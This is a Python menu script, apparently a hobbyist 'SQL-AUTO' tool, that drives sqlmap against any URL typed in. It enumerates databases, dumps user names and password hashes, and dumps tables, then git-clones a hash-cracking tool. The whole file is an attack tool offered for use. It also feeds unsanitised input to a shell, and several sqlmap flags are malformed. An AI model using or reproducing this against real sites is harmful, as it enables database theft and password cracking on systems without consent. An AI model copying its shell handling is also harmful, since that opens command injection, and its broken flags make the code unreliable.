#!/usr/bin/python

import subprocess
from colorama import Fore, init
init()
import time
print(Fore.RED)
banner = """
███████╗ ██████╗ ██╗       █████╗ ██╗   ██╗████████╗ ██████╗ 
██╔════╝██╔═══██╗██║      ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
███████╗██║   ██║██║█████╗███████║██║   ██║   ██║   ██║   ██║
╚════██║██║▄▄ ██║██║╚════╝██╔══██║██║   ██║   ██║   ██║   ██║
███████║╚██████╔╝███████╗ ██║  ██║╚██████╔╝   ██║   ╚██████╔╝
╚══════╝ ╚══▀▀═╝ ╚══════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
"""
print(banner)
print("Created by Blackster")

print(Fore.CYAN)
menu = """
1- Simple SQL injection (--dbs).
2- SQL injection with proxy (--dbs --proxy --all --hostname).
3- Scan for USERS in Database (only users).
4- Scan for PASSWORDS in Database (only hashes)
5- Select a database to dump.
6- Install Hasher(tool to crack hash).
"""
print(menu)

options = int(input("Choose an option: "))

if options==1:
    URL = str(input("Type your URL website to scan: "))
    import subprocess
    subprocess.call(f'sqlmap -u {URL} --dbs', shell = True)

elif options==2:
    URL = str(input("Type your URL here: "))
    print("Before continue you should test that your proxy is working....It's important")
    time.sleep(3)
    proxy = str(input("type your proxy here (ex: http or https//:127.0.0.1:8080): "))
    import subprocess
    subprocess.call(f'sqlmap -u {URL} --dbs --proxy{proxy} --all --hostname', shell = True)

elif options==3:
    URL = str(input("Type your url here: "))
    import subprocess
    subprocess.call(f'sqlmap -u {URL} --users', shell = True)

elif options==4:
    URL = str(input("Type your url here: "))
    import subprocess
    subprocess.call(f'sqlmap -u {URL} --passwords', shell = True)

elif options==5:
    print("!important do this after of scaning the web and databases to dump")
    time.sleep(2)
    URL = str(input("Type here your recent URL: "))
    DB = str(input("Type here the name to select your Database: "))
    import subprocess
    subprocess.call(f'sqlmap -u {URL} -random-agent -level 5 -D {DB} --tables', shell = True)

elif options==6:
    print("Now, you are going to install Hasher: tool that is used for cracking hashes...")
    time.sleep(2)
    import subprocess
    subprocess.call('git clone https://github.com/ciku370/hasher', shell = True)
